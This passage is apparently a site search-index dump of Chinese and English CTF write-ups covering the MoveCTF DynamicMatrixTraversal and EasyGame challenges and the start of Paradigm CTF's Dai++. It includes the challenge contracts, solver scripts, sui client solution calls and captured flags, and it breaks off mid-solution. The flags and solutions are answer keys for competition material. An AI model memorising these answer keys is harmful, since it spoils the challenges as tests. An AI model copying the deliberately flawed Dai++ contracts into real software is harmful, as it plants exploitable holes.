; record . count_4 = n ; } } \u51fd\u6570 up() \u8f93\u51fa\u77e9\u9635\u7b2c m \u884c\u7b2c n \u5217\u7684\u7ed3\u679c\uff0c\u5176\u4e2d\u7b2c 1 \u884c\u7b2c 1 \u5217\u6240\u6709\u5143\u7d20\u5747\u4e3a \\(1\\) \uff0c\u968f\u540e\u7b2c i \u884c\u7b2c j \u5217\u7684\u5143\u7d20\u4e3a\u7b2c i-1 \u884c\u7b2c j \u5217\u548c\u7b2c i \u884c\u7b2c j-1 \u5217\u5143\u7d20\u76f8\u52a0\u7684\u7ed3\u679c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 fun up ( m : u64 , n : u64 ): u64 { let f : vector < vector < u64 >> = vector :: empty (); let i : u64 = 0 ; while ( i < m ) { let row : vector < u64 > = vector :: empty (); let j : u64 = 0 ; while ( j < n ) { if ( j == 0 || i == 0 ) { vector :: push_back ( & mut row , 1 ); } else { let f1 = * vector :: borrow ( & f , i - 1 ); let j1 = * vector :: borrow ( & row , j - 1 ); let val = * vector :: borrow ( & f1 , j ) + j1 ; vector :: push_back ( & mut row , val ); }; j = j + 1 ; }; vector :: push_back ( & mut f , row ); i = i + 1 ; }; let fr = * vector :: borrow ( & f , m - 1 ); let result = * vector :: borrow ( & fr , n - 1 ); result } \u53ef\u4ee5\u901a\u8fc7\u66b4\u529b\u6c42\u89e3\u5f97\u5230\u4e24\u7ec4 m \u3001 n \uff0c\u5206\u522b\u4e3a m=5,n=89 \u548c m=169,n=3 \uff0c\u6070\u597d\u80fd\u6ee1\u8db3\u9898\u76ee\u9700\u6c42 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 def up ( m , n ): if n > m : return 0 f , i = None , 0 while i < m : row = [] j = 0 while j < n : if j == 0 or i == 0 : row . append ( 1 ) else : row . append ( f [ j ] + row [ j - 1 ]) j += 1 f = row i += 1 return row [ n - 1 ] for m in range ( 1 , 200 ): for n in range ( 1 , 200 ): if n > m : break ret = up ( m , n ) if ret in [ 2794155 , 14365 ]: print ( m , n ) Exploitation \u00b6 1 2 3 4 $ sui client tx-block <digest> # get Record objectID $ sui client call --function execute --args <objectId> 5 89 --module matrix --package <packageId> --gas-budget 300000000 $ sui client call --function execute --args <objectId> 169 3 --module matrix --package <packageId> --gas-budget 300000000 $ sui client call --function get_flag --args <objectId> --module matrix --package <packageId> --gas-budget 300000000 Flag \u00b6 flag{0FhsM2AMrlt9}_DynamicMatrixTraversal","title":"DynamicMatrixTraversal"},{"location":"blockchain/movectf/dynamic_matrix_traversal/#_1","text":"matrix.move 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 module dynamic_matrix_traversal :: matrix { use std :: vector ; use sui :: event ; use sui :: object ::{ Self , UID }; use sui :: transfer ; use sui :: tx_context ::{ Self , TxContext }; const TARGET_VALUE_1 : u64 = 2794155 ; const TARGET_VALUE_2 : u64 = 14365 ; const ERROR_RESULT_1 : u64 = 1 ; const ERROR_RESULT_2 : u64 = 2 ; const ERROR_PARAM_1 : u64 = 3 ; const ERROR_PARAM_2 : u64 = 4 ; struct Flag has copy , drop { user : address , flag : bool } struct Record has key { id : UID , count_1 : u64 , count_2 : u64 , count_3 : u64 , count_4 : u64 } fun init ( ctx : & mut sui :: tx_context :: TxContext ) { let record = Record { id : object :: new ( ctx ), count_1 : 0 , count_2 : 0 , count_3 : 0 , count_4 : 0 }; transfer :: share_object ( record ); } fun up ( m : u64 , n : u64 ): u64 { let f : vector < vector < u64 >> = vector :: empty (); let i : u64 = 0 ; while ( i < m ) { let row : vector < u64 > = vector :: empty (); let j : u64 = 0 ; while ( j < n ) { if ( j == 0 || i == 0 ) { vector :: push_back ( & mut row , 1 ); } else { let f1 = * vector :: borrow ( & f , i - 1 ); let j1 = * vector :: borrow ( & row , j - 1 ); let val = * vector :: borrow ( & f1 , j ) + j1 ; vector :: push_back ( & mut row , val ); }; j = j + 1 ; }; vector :: push_back ( & mut f , row ); i = i + 1 ; }; let fr = * vector :: borrow ( & f , m - 1 ); let result = * vector :: borrow ( & fr , n - 1 ); result } public entry fun execute ( record : & mut Record , m : u64 , n : u64 ) { if ( record . count_1 == 0 ) { let result : u64 = up ( m , n ); assert! ( result == TARGET_VALUE_1 , ERROR_RESULT_1 ); record . count_1 = m ; record . count_2 = n ; } else if ( record . count_3 == 0 ) { let result : u64 = up ( m , n ); assert! ( result == TARGET_VALUE_2 , ERROR_RESULT_2 ); record . count_3 = m ; record . count_4 = n ; } } public entry fun get_flag ( record : & Record , ctx : & mut TxContext ) { assert! ( record . count_1 < record . count_3 , ERROR_PARAM_1 ); assert! ( record . count_2 > record . count_4 , ERROR_PARAM_2 ); event :: emit ( Flag { user : tx_context :: sender ( ctx ), flag : true }); } #[test_only] public fun init2 ( ctx : & mut sui :: tx_context :: TxContext ) { init ( ctx ) } } Move.toml 1 2 3 4 5 6 7 8 9 [ package ] name = \"dynamic_matrix_traversal\" version = \"0.0.1\" [ dependencies ] Sui = { git = \"https://github.com/MystenLabs/sui.git\" , subdir = \"crates/sui-framework/packages/sui-framework\" , rev = \"framework/testnet\" } [ addresses ] dynamic_matrix_traversal = \"0x0\"","title":"\u9898\u76ee"},{"location":"blockchain/movectf/dynamic_matrix_traversal/#_2","text":"count_1 \u3001 count_2 \u3001 count_3 \u548c count_4 \u521d\u59cb\u503c\u4e3a \\(0\\) \uff0c\u6700\u7ec8\u9700\u8981\u6ee1\u8db3 count_1 < count_3 \u4e14 count_2 > count_4 \u901a\u8fc7 execute() \u53ef\u4ee5\u5206\u522b\u8bbe\u7f6e count_1 & count_2 \u4ee5\u53ca count_3 & count_4 \uff0c\u4f46 up(m, n) \u7684\u6267\u884c\u7ed3\u679c\u5e94\u7b49\u4e8e\u7279\u5b9a\u7684 TARGET_VALUE 1 2 3 4 5 6 7 8 9 10 11 12 13 public entry fun execute ( record : & mut Record , m : u64 , n : u64 ) { if ( record . count_1 == 0 ) { let result : u64 = up ( m , n ); assert! ( result == TARGET_VALUE_1 , ERROR_RESULT_1 ); record . count_1 = m ; record . count_2 = n ; } else if ( record . count_3 == 0 ) { let result : u64 = up ( m , n ); assert! ( result == TARGET_VALUE_2 , ERROR_RESULT_2 ); record . count_3 = m ; record . count_4 = n ; } } \u51fd\u6570 up() \u8f93\u51fa\u77e9\u9635\u7b2c m \u884c\u7b2c n \u5217\u7684\u7ed3\u679c\uff0c\u5176\u4e2d\u7b2c 1 \u884c\u7b2c 1 \u5217\u6240\u6709\u5143\u7d20\u5747\u4e3a \\(1\\) \uff0c\u968f\u540e\u7b2c i \u884c\u7b2c j \u5217\u7684\u5143\u7d20\u4e3a\u7b2c i-1 \u884c\u7b2c j \u5217\u548c\u7b2c i \u884c\u7b2c j-1 \u5217\u5143\u7d20\u76f8\u52a0\u7684\u7ed3\u679c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 fun up ( m : u64 , n : u64 ): u64 { let f : vector < vector < u64 >> = vector :: empty (); let i : u64 = 0 ; while ( i < m ) { let row : vector < u64 > = vector :: empty (); let j : u64 = 0 ; while ( j < n ) { if ( j == 0 || i == 0 ) { vector :: push_back ( & mut row , 1 ); } else { let f1 = * vector :: borrow ( & f , i - 1 ); let j1 = * vector :: borrow ( & row , j - 1 ); let val = * vector :: borrow ( & f1 , j ) + j1 ; vector :: push_back ( & mut row , val ); }; j = j + 1 ; }; vector :: push_back ( & mut f , row ); i = i + 1 ; }; let fr = * vector :: borrow ( & f , m - 1 ); let result = * vector :: borrow ( & fr , n - 1 ); result } \u53ef\u4ee5\u901a\u8fc7\u66b4\u529b\u6c42\u89e3\u5f97\u5230\u4e24\u7ec4 m \u3001 n \uff0c\u5206\u522b\u4e3a m=5,n=89 \u548c m=169,n=3 \uff0c\u6070\u597d\u80fd\u6ee1\u8db3\u9898\u76ee\u9700\u6c42 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 def up ( m , n ): if n > m : return 0 f , i = None , 0 while i < m : row = [] j = 0 while j < n : if j == 0 or i == 0 : row . append ( 1 ) else : row . append ( f [ j ] + row [ j - 1 ]) j += 1 f = row i += 1 return row [ n - 1 ] for m in range ( 1 , 200 ): for n in range ( 1 , 200 ): if n > m : break ret = up ( m , n ) if ret in [ 2794155 , 14365 ]: print ( m , n )","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/movectf/dynamic_matrix_traversal/#exploitation","text":"1 2 3 4 $ sui client tx-block <digest> # get Record objectID $ sui client call --function execute --args <objectId> 5 89 --module matrix --package <packageId> --gas-budget 300000000 $ sui client call --function execute --args <objectId> 169 3 --module matrix --package <packageId> --gas-budget 300000000 $ sui client call --function get_flag --args <objectId> --module matrix --package <packageId> --gas-budget 300000000","title":"Exploitation"},{"location":"blockchain/movectf/dynamic_matrix_traversal/#flag","text":"flag{0FhsM2AMrlt9}_DynamicMatrixTraversal","title":"Flag"},{"location":"blockchain/movectf/easy_game/","tags":["move"],"text":"#move .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 easy_game.move 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 module movectf :: easy_game { use std :: vector ; use sui :: math ; use sui :: transfer ; use sui :: tx_context :: TxContext ; use sui :: object ::{ Self , UID }; use sui :: event ; struct Challenge has key , store { id : UID , initial_part : vector < u64 > , target_amount : u64 , } struct Flag has copy , drop { user : address , flag : bool } fun init ( ctx : & mut sui :: tx_context :: TxContext ) { let initial_part = vector :: empty < u64 > (); vector :: push_back ( & mut initial_part , 1 ); vector :: push_back ( & mut initial_part , 2 ); vector :: push_back ( & mut initial_part , 4 ); vector :: push_back ( & mut initial_part , 5 ); vector :: push_back ( & mut initial_part , 1 ); vector :: push_back ( & mut initial_part , 3 ); vector :: push_back ( & mut initial_part , 6 ); vector :: push_back ( & mut initial_part , 7 ); let challenge = Challenge { id : object :: new ( ctx ), initial_part : initial_part , target_amount : 22 , }; transfer :: share_object ( challenge ); } public fun submit_solution ( user_input : vector < u64 > , rc : & mut Challenge , ctx : & mut TxContext ){ let sender = sui :: tx_context :: sender ( ctx ); let houses = rc . initial_part ; vector :: append ( & mut houses , user_input ); let amount_robbed = rob ( & houses ); let result = amount_robbed == rc . target_amount ; if ( result ) { event :: emit ( Flag { user : sender , flag : true }); }; } public fun rob ( houses : & vector < u64 > ): u64 { let n = vector :: length ( houses ); if ( n == 0 ){ 0 ; }; let v = vector :: empty < u64 > (); vector :: push_back ( & mut v , * vector :: borrow ( houses , 0 )); if ( n > 1 ){ vector :: push_back ( & mut v , math :: max ( * vector :: borrow ( houses , 0 ), * vector :: borrow ( houses , 1 ))); }; let i = 2 ; while ( i < n ) { let dp_i_1 = * vector :: borrow ( & v , i - 1 ); let dp_i_2_plus_house = * vector :: borrow ( & v , i - 2 ) + * vector :: borrow ( houses , i ); vector :: push_back ( & mut v , math :: max ( dp_i_1 , dp_i_2_plus_house )); i = i + 1 ; } ; * vector :: borrow ( & v , n - 1 ) } } Move.toml 1 2 3 4 5 6 7 8 9 10 [package] name = \"easy_game\" version = \"0.0.1\" [dependencies] Sui = { git = \"https://github.com/MystenLabs/sui.git\" , subdir = \"crates/sui-framework/packages/sui-framework\" , rev = \"framework/testnet\" } [addresses] movectf = \"0x0\" sui = \"0x0000000000000000000000000000000000000002\" \u89e3\u9898\u601d\u8def \u00b6 \u4e3a\u89e6\u53d1 Flag \u4e8b\u4ef6\u9700\u8981 amount_robbed \u4e3a \\(22\\) \uff0c\u5373 rob() \u7684\u8fd4\u56de\u503c \u5bf9\u4e8e\u7ed9\u5b9a\u7684\u6570\u7ec4 houses \uff0c rob() \u5c06\u65b0\u5efa\u6570\u7ec4 v \u5e76\u6dfb\u52a0\u5143\u7d20 houses[0] \u548c max(houses[0], houses[1]) \u3002\u968f\u540e\u4f9d\u6b21\u8ba1\u7b97 max(v[i-1], v[i-2] + houses[i]) (2 <= i < n) \u5e76\u52a0\u5165\u5230\u6570\u7ec4 v \u4e2d\uff0c\u6700\u7ec8\u8fd4\u56de\u6570\u7ec4 v \u7684\u6700\u540e\u4e00\u4e2a\u503c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public fun rob ( houses : & vector < u64 > ): u64 { let n = vector :: length ( houses ); if ( n == 0 ) { 0 ; }; let v = vector :: empty < u64 > (); vector :: push_back ( & mut v , * vector :: borrow ( houses , 0 )); if ( n > 1 ) { vector :: push_back ( & mut v , math :: max ( * vector :: borrow ( houses , 0 ), * vector :: borrow ( houses , 1 ))); }; let i = 2 ; while ( i < n ) { let dp_i_1 = * vector :: borrow ( & v , i - 1 ); let dp_i_2_plus_house = * vector :: borrow ( & v , i - 2 ) + * vector :: borrow ( houses , i ); vector :: push_back ( & mut v , math :: max ( dp_i_1 , dp_i_2_plus_house )); i = i + 1 ; }; * vector :: borrow ( & v , n - 1 ) } \u6839\u636e init() \uff0c houses \u6570\u7ec4\u4e3a [1, 2, 4, 5, 1, 3, 6, 7, user_input] \uff0c\u53ef\u4ee5\u63a8\u51fa\u6570\u7ec4 v \u9700\u8981\u6ee1\u8db3 [1, 2, 5, 7, 7, 10, 13, 17, 22] \uff0c\u7531\u6b64\u53ef\u77e5 user_input \u4e3a \\(22-13=9\\) Exploitation \u00b6 1 2 $ sui client tx-block <digest> # get Challenge objectID $ sui client call --function submit_solution --args [ 9 ] <objectId> --module easy_game --package <packageId> --gas-budget 300000000 Flag \u00b6 flag{yUH6yansnMpi}_EasyGame","title":"EasyGame"},{"location":"blockchain/movectf/easy_game/#_1","text":"easy_game.move 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 module movectf :: easy_game { use std :: vector ; use sui :: math ; use sui :: transfer ; use sui :: tx_context :: TxContext ; use sui :: object ::{ Self , UID }; use sui :: event ; struct Challenge has key , store { id : UID , initial_part : vector < u64 > , target_amount : u64 , } struct Flag has copy , drop { user : address , flag : bool } fun init ( ctx : & mut sui :: tx_context :: TxContext ) { let initial_part = vector :: empty < u64 > (); vector :: push_back ( & mut initial_part , 1 ); vector :: push_back ( & mut initial_part , 2 ); vector :: push_back ( & mut initial_part , 4 ); vector :: push_back ( & mut initial_part , 5 ); vector :: push_back ( & mut initial_part , 1 ); vector :: push_back ( & mut initial_part , 3 ); vector :: push_back ( & mut initial_part , 6 ); vector :: push_back ( & mut initial_part , 7 ); let challenge = Challenge { id : object :: new ( ctx ), initial_part : initial_part , target_amount : 22 , }; transfer :: share_object ( challenge ); } public fun submit_solution ( user_input : vector < u64 > , rc : & mut Challenge , ctx : & mut TxContext ){ let sender = sui :: tx_context :: sender ( ctx ); let houses = rc . initial_part ; vector :: append ( & mut houses , user_input ); let amount_robbed = rob ( & houses ); let result = amount_robbed == rc . target_amount ; if ( result ) { event :: emit ( Flag { user : sender , flag : true }); }; } public fun rob ( houses : & vector < u64 > ): u64 { let n = vector :: length ( houses ); if ( n == 0 ){ 0 ; }; let v = vector :: empty < u64 > (); vector :: push_back ( & mut v , * vector :: borrow ( houses , 0 )); if ( n > 1 ){ vector :: push_back ( & mut v , math :: max ( * vector :: borrow ( houses , 0 ), * vector :: borrow ( houses , 1 ))); }; let i = 2 ; while ( i < n ) { let dp_i_1 = * vector :: borrow ( & v , i - 1 ); let dp_i_2_plus_house = * vector :: borrow ( & v , i - 2 ) + * vector :: borrow ( houses , i ); vector :: push_back ( & mut v , math :: max ( dp_i_1 , dp_i_2_plus_house )); i = i + 1 ; } ; * vector :: borrow ( & v , n - 1 ) } } Move.toml 1 2 3 4 5 6 7 8 9 10 [package] name = \"easy_game\" version = \"0.0.1\" [dependencies] Sui = { git = \"https://github.com/MystenLabs/sui.git\" , subdir = \"crates/sui-framework/packages/sui-framework\" , rev = \"framework/testnet\" } [addresses] movectf = \"0x0\" sui = \"0x0000000000000000000000000000000000000002\"","title":"\u9898\u76ee"},{"location":"blockchain/movectf/easy_game/#_2","text":"\u4e3a\u89e6\u53d1 Flag \u4e8b\u4ef6\u9700\u8981 amount_robbed \u4e3a \\(22\\) \uff0c\u5373 rob() \u7684\u8fd4\u56de\u503c \u5bf9\u4e8e\u7ed9\u5b9a\u7684\u6570\u7ec4 houses \uff0c rob() \u5c06\u65b0\u5efa\u6570\u7ec4 v \u5e76\u6dfb\u52a0\u5143\u7d20 houses[0] \u548c max(houses[0], houses[1]) \u3002\u968f\u540e\u4f9d\u6b21\u8ba1\u7b97 max(v[i-1], v[i-2] + houses[i]) (2 <= i < n) \u5e76\u52a0\u5165\u5230\u6570\u7ec4 v \u4e2d\uff0c\u6700\u7ec8\u8fd4\u56de\u6570\u7ec4 v \u7684\u6700\u540e\u4e00\u4e2a\u503c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public fun rob ( houses : & vector < u64 > ): u64 { let n = vector :: length ( houses ); if ( n == 0 ) { 0 ; }; let v = vector :: empty < u64 > (); vector :: push_back ( & mut v , * vector :: borrow ( houses , 0 )); if ( n > 1 ) { vector :: push_back ( & mut v , math :: max ( * vector :: borrow ( houses , 0 ), * vector :: borrow ( houses , 1 ))); }; let i = 2 ; while ( i < n ) { let dp_i_1 = * vector :: borrow ( & v , i - 1 ); let dp_i_2_plus_house = * vector :: borrow ( & v , i - 2 ) + * vector :: borrow ( houses , i ); vector :: push_back ( & mut v , math :: max ( dp_i_1 , dp_i_2_plus_house )); i = i + 1 ; }; * vector :: borrow ( & v , n - 1 ) } \u6839\u636e init() \uff0c houses \u6570\u7ec4\u4e3a [1, 2, 4, 5, 1, 3, 6, 7, user_input] \uff0c\u53ef\u4ee5\u63a8\u51fa\u6570\u7ec4 v \u9700\u8981\u6ee1\u8db3 [1, 2, 5, 7, 7, 10, 13, 17, 22] \uff0c\u7531\u6b64\u53ef\u77e5 user_input \u4e3a \\(22-13=9\\)","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/movectf/easy_game/#exploitation","text":"1 2 $ sui client tx-block <digest> # get Challenge objectID $ sui client call --function submit_solution --args [ 9 ] <objectId> --module easy_game --package <packageId> --gas-budget 300000000","title":"Exploitation"},{"location":"blockchain/movectf/easy_game/#flag","text":"flag{yUH6yansnMpi}_EasyGame","title":"Flag"},{"location":"blockchain/paradigm/dai_plus_plus/","tags":["smart contract","clones with immutable args"],"text":"#smart contract #clones with immutable args .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 MakerDAO is such a complex codebase, and we all know that larger codebases are more likely to have bugs. I simplified everything, so there shouldn't be any bugs here. Deploy.s.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.13 ; import \"forge-ctf/CTFDeployment.sol\" ; import \"../src/Challenge.sol\" ; import \"../src/SystemConfiguration.sol\" ; import { Account as Acct } from \"../src/Account.sol\" ; contract Deploy is CTFDeployment { function deploy ( address system , address ) internal override returns ( address challenge ) { vm . startBroadcast ( system ); SystemConfiguration configuration = new SystemConfiguration (); AccountManager manager = new AccountManager ( configuration ); configuration . updateAccountManager ( address ( manager )); configuration . updateStablecoin ( address ( new Stablecoin ( configuration ))); configuration . updateAccountImplementation ( address ( new Acct ())); configuration . updateEthUsdPriceFeed ( 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419 ); configuration . updateSystemContract ( address ( manager ), true ); challenge = address ( new Challenge ( configuration )); vm . stopBroadcast (); } } src/Challenge.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.13 ; import \"../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\" ; import \"./SystemConfiguration.sol\" ; contract Challenge { SystemConfiguration public immutable SYSTEM_CONFIGURATION ; constructor ( SystemConfiguration configuration ) { SYSTEM_CONFIGURATION = configuration ; } function isSolved () external view returns ( bool ) { return IERC20 ( SYSTEM_CONFIGURATION . getStablecoin ()). totalSupply () > 1 _000_000_000_000 ether ; } } src/SystemConfiguration.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 import \"@openzeppelin/contracts/access/Ownable.sol\" ; import \"./Account.sol\" ; contract SystemConfiguration is Ownable { address private accountImplementation ; address private ethUsdPriceFeed ; address private accountManager ; address private stablecoin ; uint256 private collateralRatio ; mapping ( address => bool ) private _systemContracts ; constructor () { collateralRatio = 15000 ; } function updateAccountImplementation ( address newImplementation ) external onlyOwner { accountImplementation = newImplementation ; } function updateEthUsdPriceFeed ( address newPriceFeed ) external onlyOwner { ethUsdPriceFeed = newPriceFeed ; } function updateStablecoin ( address newStablecoin ) external onlyOwner { stablecoin = newStablecoin ; } function updateAccountManager ( address newAccountManager ) external onlyOwner { accountManager = newAccountManager ; } function updateCollateralRatio ( uint256 newRatio ) external onlyOwner { collateralRatio = newRatio ; } function updateSystemContract ( address target , bool authorized ) external onlyOwner { _systemContracts [ target ] = authorized ; } function getAccountImplementation () external view returns ( address ) { return accountImplementation ; } function getEthUsdPriceFeed () external view returns ( address ) { return ethUsdPriceFeed ; } function getCollateralRatio () external view returns ( uint256 ) { return collateralRatio ; } function getStablecoin () external view returns ( address ) { return stablecoin ; } function getAccountManager () external view returns ( address ) { return accountManager ; } function isAuthorized ( address who ) external view returns ( bool ) { return _systemContracts [ who ]; } } src/Account.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 import \"@clones-with-immutable-args/src/Clone.sol\" ; import \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\" ; import \"@openzeppelin/contracts/utils/cryptography/SignatureChecker.sol\" ; import \"./SystemConfiguration.sol\" ; import \"./AccountManager.sol\" ; contract Account is Clone { event DebtIncreased ( uint256 amount , string memo ); event DebtDecreased ( uint256 amount , string memo ); uint256 private debt ; function deposit () external payable {} function withdraw ( uint256 amount ) external { require ( msg . sender == _getArgAddress ( 20 ), \"ONLY_ACCOUNT_HOLDER\" ); require ( isHealthy ( amount , 0 ), \"NOT_HEALTHY\" ); ( bool ok ,) = payable ( msg . sender ). call { value : amount }( hex \"\" ); require ( ok , \"TRANSFER_FAILED\" ); } function increaseDebt ( address operator , uint256 amount , string calldata memo ) external { SystemConfiguration configuration = SystemConfiguration ( _getArgAddress ( 0 )); require ( configuration . isAuthorized ( msg . sender ), \"NOT_AUTHORIZED\" ); require ( operator == _getArgAddress ( 20 ), \"ONLY_ACCOUNT_HOLDER\" ); require ( isHealthy ( 0 , amount ), \"NOT_HEALTHY\" ); debt += amount ; emit DebtIncreased ( amount , memo ); } function decreaseDebt ( uint256 amount , string calldata memo ) external { SystemConfiguration configuration = SystemConfiguration ( _getArgAddress ( 0 )); require ( configuration . isAuthorized ( msg . sender ), \"NOT_AUTHORIZED\" ); debt -= amount ; emit DebtDecreased ( amount , memo ); } function isHealthy ( uint256 collateralDecrease , uint256 debtIncrease ) public view returns ( bool ) { SystemConfiguration configuration = SystemConfiguration ( _getArgAddress ( 0 )); uint256 totalBalance = address ( this ). balance - collateralDecrease ; uint256 totalDebt = debt + debtIncrease ; (, int256 ethPriceInt ,,,) = AggregatorV3Interface ( configuration . getEthUsdPriceFeed ()). latestRoundData (); if ( ethPriceInt <= 0 ) return false ; uint256 ethPrice = uint256 ( ethPriceInt ); return totalBalance * ethPrice / 1e8 >= totalDebt * configuration . getCollateralRatio () / 10000 ; } function recoverAccount ( address newOwner , address [] memory newRecoveryAccounts , bytes [] memory signatures ) external returns ( Account ) { require ( isHealthy ( 0 , 0 ), \"UNHEALTHY_ACCOUNT\" ); bytes32 signHash = keccak256 ( abi . encodePacked ( block . chainid , _getArgAddress ( 20 ), newOwner , newRecoveryAccounts )); uint256 numRecoveryAccounts = _getArgUint256 ( 40 ); require ( signatures . length == numRecoveryAccounts , \"INCORRECT_LENGTH\" ); for ( uint256 i = 0 ; i < numRecoveryAccounts ; i ++ ) { require ( SignatureChecker . isValidSignatureNow ( _getArgAddress ( 72 + 32 * i ), signHash , signatures [ i ]), \"INVALID_SIGNATURE\" ); } SystemConfiguration configuration = SystemConfiguration ( _getArgAddress ( 0 )); uint256 currentDebt = debt ; debt = 0 ; return AccountManager ( configuration . getAccountManager ()). migrateAccount { value : address ( this ). balance }( newOwner , newRecoveryAccounts , currentDebt ); } } AccountManager.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 import \"@clones-with-immutable-args/src/ClonesWithImmutableArgs.sol\" ; import \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\" ; import \"./Account.sol\" ; import \"./Stablecoin.sol\" ; contract AccountManager { using ClonesWithImmutableArgs for address ; SystemConfiguration private immutable SYSTEM_CONFIGURATION ; mapping ( Account => bool ) public validAccounts ; constructor ( SystemConfiguration configuration ) { SYSTEM_CONFIGURATION = configuration ; } modifier onlyValidAccount ( Account account ) { require ( validAccounts [ account ], \"INVALID_ACCOUNT\" ); _ ; } function openAccount ( address owner , address [] calldata recoveryAddresses ) external returns ( Account ) { return _openAccount ( owner , recoveryAddresses ); } function migrateAccount ( address owner , address [] calldata recoveryAddresses , uint256 debt ) external payable returns ( Account ) { Account account = _openAccount ( owner , recoveryAddresses ); account . deposit { value : msg . value }(); account . increaseDebt ( owner , debt , \"account migration\" ); return account ; } function _openAccount ( address owner , address [] calldata recoveryAddresses ) private returns ( Account ) { Account account = Account ( SYSTEM_CONFIGURATION . getAccountImplementation (). clone ( abi . encodePacked ( SYSTEM_CONFIGURATION , owner , recoveryAddresses . length , recoveryAddresses ) ) ); validAccounts [ account ] = true ; return account ; } function mintStablecoins ( Account account , uint256 amount , string calldata memo ) external onlyValidAccount ( account ) { account . increaseDebt ( msg . sender , amount , memo ); Stablecoin ( SYSTEM_CONFIGURATION . getStablecoin ()). mint ( msg . sender , amount ); } function burnStablecoins ( Account account , uint256 amount , string calldata memo ) external onlyValidAccount ( account ) { account . decreaseDebt ( amount , memo ); Stablecoin ( SYSTEM_CONFIGURATION . getStablecoin ()). burn ( msg . sender , amount ); } } src/Stablecoin.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\" ; import \"./SystemConfiguration.sol\" ; contract Stablecoin is ERC20 ( \"US Dollar Stablecoin\" , \"USDS\" ) { SystemConfiguration private immutable SYSTEM_CONFIGURATION ; constructor ( SystemConfiguration configuration ) { SYSTEM_CONFIGURATION = configuration ; } function mint ( address to , uint256 amount ) external { require ( SYSTEM_CONFIGURATION . isAuthorized ( msg . sender ), \"NOT_AUTHORIZED\" ); _mint ( to , amount ); } function burn ( address from , uint256 amount ) external { require ( SYSTEM_CONFIGURATION . isAuthorized ( msg . sender ), \"NOT_AUTHORIZED\" ); _burn ( from , amount ); } } Solution \u00b6 The challenge is solved if the total supply of Stablecoin is greater than \\(10^{12} \\times 10^{18}\\) Accounts authorized by the SystemConfiguration contract can mint stable coins. Only the owner of SystemConfiguration can update system contracts (i.e. authorized accounts) and the AccountManager contract is the only authorized contract In the AccountManager contract, only valid accounts can mint stable coins. Meanwhile, the debt on the account will increase 1 2 3 4 5 6 7 8 function mintStablecoins ( Account account , uint256 amount , string calldata memo ) external onlyValidAccount ( account ) { account . increaseDebt ( msg . sender , amount , memo ); Stablecoin ( SYSTEM_CONFIGURATION . getStablecoin ()). mint ( msg . sender , amount ); } In the increaseDebt() function, if the account is not healthy after the debt is increased, the transaction will fail. However, the player don't have enough ETH to mint \\(10^{12}\\) stable coins and keep the account healthy 1 2 3 4 5 6 7 8 9 10 11 12 13 function increaseDebt ( address operator , uint256 amount , string calldata memo ) external { ... require ( isHealthy ( 0 , amount ), \"NOT_HEALTHY\" ); debt += amount ; ... } function isHealthy ( uint256 